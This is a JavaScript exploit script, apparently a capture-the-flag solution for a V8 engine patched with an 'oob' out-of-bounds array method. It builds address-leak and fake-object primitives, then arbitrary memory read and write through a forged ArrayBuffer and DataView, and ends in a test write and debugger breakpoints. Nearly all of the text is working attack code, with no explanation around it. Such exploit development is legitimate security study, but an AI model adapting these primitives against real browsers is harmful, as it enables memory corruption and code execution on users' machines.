const array_buffer = new ArrayBuffer(8);
let data_view = new DataView(array_buffer);

let u2d = (value) => {
    data_view.setBigUint64(0, value);
    return data_view.getFloat64(0);
};

let d2u = (value) => {
    data_view.setFloat64(0, value);
    return data_view.getBigUint64(0);
};

let hex = (value) => {
    return '0x' + value.toString(16).padStart(16, "0");
}

let test_value = 123n;
console.log("test_value", u2d(test_value), d2u(u2d(test_value)));

let obj = {};
let float_array = [1.1];
let obj_array = [obj];
//----oob() => map----
let float_array_map = float_array.oob();
let obj_array_map = obj_array.oob();
% DebugPrint(float_array);
% DebugPrint(obj_array);

console.log("float_array_map", hex(d2u(float_array_map)));
console.log("obj_array_map", hex(d2u(obj_array_map)));

let address_of = (obj) => {
    float_array.oob(obj_array_map);
    float_array[0] = obj;
    float_array.oob(float_array_map);
    return d2u(float_array[0]);
};

let fake_obj = (address) => {
    // obj_array.oob(float_array_map);
    // obj_array[0] = u2d(address | 1n);
    // obj_array.oob(obj_array_map);
    // return obj_array[0];
    float_array.oob(float_array_map);
    float_array[0] = u2d(address | 1n);
    float_array.oob(obj_array_map);
    return float_array[0];
};

let float_array_mem = [
    float_array_map,
    u2d(0n),
    u2d(0xdeadbeefn),
    u2d(1n << 32n),
];
let fake_float_array = fake_obj(address_of(float_array_mem) + 0x30n);

let read = (address) => {
    float_array_mem[2] = u2d((address - 0x10n) | 1n);
    return d2u(fake_float_array[0]);
};
let write = (address, value) => {
    float_array_mem[2] = u2d((address - 0x10n) | 1n);
    fake_float_array[0] = u2d(value);
};

// let arr = [1.1, 2.2];
// console.log("address_of(arr)", hex(address_of(arr)));
// % DebugPrint(arr);
// write(address_of(arr), 0xdeadbeefn);

console.log("address_of(array_buffer)", hex(address_of(array_buffer)));
let array_buffer_map = read(address_of(array_buffer));
% DebugPrint(array_buffer);
console.log("array_buffer_map", hex(array_buffer_map));

let fake_array_buffer_mem = [
    u2d(array_buffer_map),
    u2d(0n),
    u2d(0n),
    u2d(8n),
    u2d(0xdeadbeefn),
];
% DebugPrint(fake_array_buffer_mem);
let fake_array_buffer = fake_obj(address_of(fake_array_buffer_mem) + 0x40n);

let fake_data_view = new DataView(fake_array_buffer);
% DebugPrint(fake_data_view);

let ab_read = (address) => {
    fake_array_buffer_mem[4] = u2d(address);
    return fake_data_view.getBigUint64(0, true);
};
let ab_write = (address, value) => {
    fake_array_buffer_mem[4] = u2d(address);
    fake_data_view.setBigUint64(0, value, true);
};

let arr = [1.1, 2.2, 3.3, 4.4];
% DebugPrint(arr);

let arr_elem_addr = (address_of(arr) & ~1n) - 48n;
console.log(hex(arr_elem_addr));
ab_write(arr_elem_addr + 0x10n, 0xdeadbeefn);
% SystemBreak();

% SystemBreak();
/**
 * r --allow-natives-syntax --shell ../exp/exp2.js
 */